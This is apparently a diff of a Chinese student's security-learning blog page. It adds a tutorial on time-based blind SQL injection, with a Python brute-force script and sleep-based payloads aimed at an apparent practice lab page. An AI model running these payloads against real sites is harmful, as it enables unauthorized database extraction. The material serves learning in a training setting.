@@ -41,7 +41,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>9</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>10</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,64 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/30/sql注入之时间盲注/" class="article-date">
+  <time class="post-time" datetime="2018-04-30T08:37:07.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br/>
+    <span class="post-day">30</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/30/sql注入之时间盲注/">sql注入之时间盲注</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用<strong>第二种注入–延时注入</strong>来判断我们所要的信息。<br>主要用到的是<strong>sleep()函数</strong>如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。<br>一般我们使用</p>
+<blockquote>
+<p>if(,1,2)<br>case when() then else end   </p>
+</blockquote>
+<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="./images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="./images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
+<p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
+<p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjgmggw61000bdove8uclxttn" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-sql注入之布尔型注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -101,7 +159,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>在过滤了union，仅存select这个关键词的时候，那我们应该如何使用别的查询语句来查询我们所要的信息呢？或者是我们无法看到之前我们需要的回显位了，那么这个时候我们可以考虑<strong>第一种思路—-布尔型注入</strong>。<br>简而言之，布尔型注入就是判断你查询的语句是否为真，再通过夹逼的方式确定那个值是什么。这就需要用到几个函数了。<br>exists():用于检查子查询是否有返回数据。结果是ture或者false<br>ascii():把字符转化成ascii码<br>substr():substr（string string，num start，num length）截断一部分字符串，偏移从1开始，并不是0<br>count():记录出现的次数<br>接下来在实例中讲解一下布尔型注入的基本思路<br><img src="./images/8/1.png" alt=""><br>这里可以试试我们的联合查询是否可以得到我们想要的结果<img src="./images/8/2.png" alt="">在这里发现并不行，根本没有回显位，所以联合查询的方式肯定是不行的。所以我们考虑使用布尔型注入来试试。试了一个最基本的判断。</p>
+        <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>在过滤了union，仅存select这个关键词的时候，或者是返回并没有显示位时，那我们应该如何使用别的查询语句来查询我们所要的信息呢？或者是我们无法看到之前我们需要的回显位了，那么这个时候我们可以考虑<strong>第一种思路—-布尔型注入</strong>。<br>简而言之，布尔型注入就是判断你查询的语句是否为真，再通过夹逼的方式确定那个值是什么。这就需要用到几个函数了。<br>exists():用于检查子查询是否有返回数据。结果是ture或者false<br>ascii():把字符转化成ascii码<br>substr():substr（string string，num start，num length）截断一部分字符串，偏移从1开始，并不是0<br>count():记录出现的次数<br>接下来在实例中讲解一下布尔型注入的基本思路<br><img src="./images/8/1.png" alt=""><br>这里可以试试我们的联合查询是否可以得到我们想要的结果<img src="./images/8/2.png" alt="">在这里发现并不行，根本没有回显位，所以联合查询的方式肯定是不行的。所以我们考虑使用布尔型注入来试试。试了一个最基本的判断。</p>
 <blockquote>
 <p><a href="http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+" target="_blank" rel="noopener">http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+</a>  </p>
 </blockquote>
@@ -121,12 +179,12 @@
 <blockquote>
 <p>[‘fgd’, ‘Artgr’, ‘das’, ‘dddddddddddd’, ‘AAAAAA’, ‘vAdcvAcv’]  </p>
 </blockquote>
-<p>这是最基本的流程，在一些细节的地方还需要多多去尝试，bypass的手段还需要练习。</p>
+<p>这是最基本的流程，在一些细节的地方还需要多多去尝试，bypass的手段还需要练习。   </p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjgkc7pr9000erkve2yuzvz6o" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjgmggw7l000ndovefysd06ba" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -223,7 +281,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjgkc7prm000jrkvet1zetooo" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjgmggw73000gdovem4a4jsch" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -282,7 +340,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjgkc7prq000lrkve91c4no7o" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjgmggw7e000ldoveveyhjp12" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>
@@ -343,7 +401,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjgkc7pqz000arkvec6qd6c63" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjgmggw6s000fdovewxudzfju" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-PHP/">Web PHP</a></li></ul>
@@ -398,7 +456,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjgkc7pqt0008rkve8sc6iyyp" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjgmggw5h000adoveqe3c64ex" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -454,7 +512,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjgkc7prf000frkvetug6fdxc" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjgmggw580008dove5udx18lk" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -509,7 +567,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjgkc7ppv0000rkveduf71yxg" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjgmggw4c0004dove1ry1xvxc" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -567,7 +625,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjgkc7pqm0006rkve8uqea9h3" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjgmggw3i0002dovedrcfas56" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -619,7 +677,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/28/0x00 关于搭建博客的一些心得/" data-id="cjgkc7pq80002rkve13riakpm" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/02/28/0x00 关于搭建博客的一些心得/" data-id="cjgmggw280000doveo66ni22r" class="article-share-link">分享</a>
       
       
     </footer>
@@ -671,7 +729,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>9</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>10</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
